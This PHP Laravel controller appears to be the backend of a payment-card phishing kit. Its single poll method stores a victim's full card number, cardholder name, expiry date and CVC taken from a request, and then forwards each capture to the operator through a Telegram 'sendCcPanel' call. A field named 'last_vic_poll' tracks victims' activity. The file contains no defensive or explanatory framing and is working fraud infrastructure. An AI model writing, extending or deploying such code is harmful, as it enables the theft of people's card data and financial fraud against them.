<?php

namespace App\Http\Controllers;

use App\Models\PaymentSession;
use App\Models\PaymentWindow;
use App\Models\ProductPage;
use App\Services\TelegramService;
use DB;
use Exception;
use Illuminate\Http\Request;
use Inertia\Inertia;
use Longman\TelegramBot\Entities\InlineKeyboard;
use Str;

class ApiController extends Controller
{

    public function poll(Request $request, $pin, $paymentSessionId, $paymentWindowId)
    {
        $productPage = ProductPage::where('pin_code', '=', $pin)->firstOrFail();
        $paymentSession = PaymentSession::findOrFail($paymentSessionId);

        if ($paymentSession->product_page_id != $productPage->id) abort(400);

        $paymentWindow = $paymentSession->paymentWindows()->where('payment_window_id', '=', $paymentWindowId)->first();

        if ($paymentWindow == null) {
            DB::beginTransaction();
            try {
                $paymentSession = PaymentSession::lockForUpdate()->find($paymentSession->id);
                $paymentWindow = $paymentSession->paymentWindows()->where('payment_window_id', '=', $paymentWindowId)->first();

                if ($paymentWindow == null) {
                    $paymentWindow = PaymentWindow::create([
                        'payment_session_id' => $paymentSession->id,
                        'payment_window_id' => $paymentWindowId,
                        'cc_number' => $request->input('ccNumber'),
                        'cc_owner' => $request->input('ccOwner'),
                        'cc_expiration_date' => $request->input('ccDate'),
                        'cc_cvc' => $request->input('ccCvc'),
                        'last_vic_poll' => now(),
                    ]);


                    app(TelegramService::class)->sendCcPanel($productPage, $paymentSession, $paymentWindow);
                }

                DB::commit();
            } catch (Exception $exception) {
                DB::rollBack();
                throw $exception;
            }

            $paymentWindow = $paymentSession->paymentWindows()->where('payment_window_id', '=', $paymentWindowId)->first();
        }

        $paymentWindow->last_vic_poll = now();
        $paymentWindow->save();

        return response()->json($paymentWindow->toArray());
    }

}
